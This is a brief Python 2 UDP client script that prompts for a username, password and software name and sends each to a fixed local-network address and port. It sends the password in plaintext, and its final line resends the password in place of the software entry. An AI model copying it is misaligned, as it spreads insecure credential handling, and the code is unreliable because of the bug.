#!/usr/bin/python
import os
import time
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
print"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
x=raw_input("enter username : ")
s.sendto(x,("192.168.0.53",9999))
y=raw_input("enter password : ")
s.sendto(y,("192.168.0.53",9999))
z=raw_input("enter software : ")
s.sendto(y,("192.168.0.53",9999))





